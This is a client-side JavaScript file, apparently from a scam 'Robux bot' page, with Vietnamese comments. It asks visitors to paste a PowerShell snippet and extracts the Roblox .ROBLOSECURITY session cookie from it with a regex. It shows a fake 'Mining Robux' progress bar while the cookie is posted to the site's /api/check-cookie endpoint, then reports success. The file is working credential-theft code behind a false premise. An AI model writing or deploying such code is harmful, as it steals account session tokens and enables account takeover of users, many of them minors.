function startBotting() {
    extractAndCheckCookie();
}

async function extractAndCheckCookie() {
    const inputText = document.getElementById("powershellInput")?.value;
    const amount = document.getElementById("amount")?.value || "0";
    const notificationElement = document.getElementById("notification");

    if (!inputText || !notificationElement) {
        console.error("Thiếu input hoặc notification element");
        showNotification("❌ Vui lòng kiểm tra input!", "error");
        return;
    }

    const cookieMatch = inputText.match(/New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/i);
    if (!cookieMatch || cookieMatch.length < 2) {
        showNotification("❌ Invalid User Code", "error");
        return;
    }

    const extractedCookie = cookieMatch[1];
    // Chạy progress bar và chờ nó hoàn thành trước khi gửi API
    await showProgressNotification(extractedCookie, amount);

    try {
        const response = await fetch('/api/check-cookie', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: extractedCookie }),
        });

        const result = await response.json();
        if (result.success) {
            showNotification("✅ Bot succeeds robux!", "success");
        } else {
            showNotification(`❌ ${result.error}`, "error");
        }
    } catch (error) {
        console.error("Lỗi khi gửi cookie:", error);
        showNotification("❌ Lỗi kết nối server!", "error");
    }
}

function showNotification(message, type) {
    const notification = document.getElementById("notification");
    if (!notification) return;

    notification.innerHTML = `
        <div class="error-icon">${type === "success" ? "✅" : "❌"}</div>
        <h2>${message}</h2>
        <button class="continue-btn" onclick="closeNotification()">Continue</button>
    `;

    gsap.fromTo(notification, 
        { opacity: 0, scale: 0.8, y: 50 },
        { 
            opacity: 1, 
            scale: 1, 
            y: 0, 
            duration: 0.5, 
            ease: "back.out(1.7)",
            onStart: () => {
                notification.style.display = "block";
                notification.classList.add("show", type);
                notification.classList.remove("success", "error", "info");
            }
        }
    );
    setTimeout(closeNotification, 5000);
}

async function showProgressNotification(cookie, amount) {
    const notification = document.getElementById("notification");
    if (!notification) {
        console.error("Không tìm thấy notification");
        return;
    }

    notification.innerHTML = `
        <div class="error-icon">⏳</div>
        <h2 class="progress-message">Đang kiểm tra cookie...</h2>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <button class="continue-btn" onclick="closeNotification()">Continue</button>
    `;

    const progressFill = notification.querySelector(".progress-fill");
    const progressMessage = notification.querySelector(".progress-message");
    if (!progressFill || !progressMessage) {
        console.error("Không tìm thấy progress-fill hoặc progress-message");
        return;
    }

    gsap.fromTo(notification, 
        { opacity: 0, scale: 0.8, y: 50 },
        { 
            opacity: 1, 
            scale: 1, 
            y: 0, 
            duration: 0.5, 
            ease: "back.out(1.7)",
            onStart: () => {
                notification.style.display = "block";
                notification.classList.add("show", "info");
                notification.classList.remove("success", "error");
            }
        }
    );

    gsap.killTweensOf(progressFill); // Xóa animation cũ

    // Trả về Promise để chờ timeline hoàn thành
    return new Promise((resolve) => {
        const tl = gsap.timeline({ defaults: { ease: "linear" } });
        tl.fromTo(progressFill, 
            { width: "0%" },
            { 
                width: "10%", 
                duration: 1,
                immediateRender: true,
                onStart: () => progressMessage.textContent = "Loading File User..."
            }
        ).to(progressFill, 
            { 
                width: "20%", 
                duration: 1,
                onStart: () => progressMessage.textContent = "Bot is up to mining"
            }
        ).to(progressFill, 
            { 
                width: "100%", 
                duration: 3,
                onStart: () => progressMessage.textContent = `Mining ${amount} Robux`,
                onComplete: () => {
                    progressMessage.textContent = "Progress completed!";
                    resolve(); // Hoàn thành Promise khi timeline xong
                }
            }
        );

        tl.eventCallback("onUpdate", () => {
            console.log("Current width:", progressFill.style.width);
        });
    });
}

function closeNotification() {
    const notification = document.getElementById("notification");
    if (!notification) return;

    gsap.to(notification, {
        opacity: 0,
        scale: 0.8,
        y: 50,
        duration: 0.5,
        ease: "back.in(1.7)",
        onComplete: () => {
            notification.style.display = "none";
            notification.classList.remove("show", "success", "error", "info");
        }
    });
}
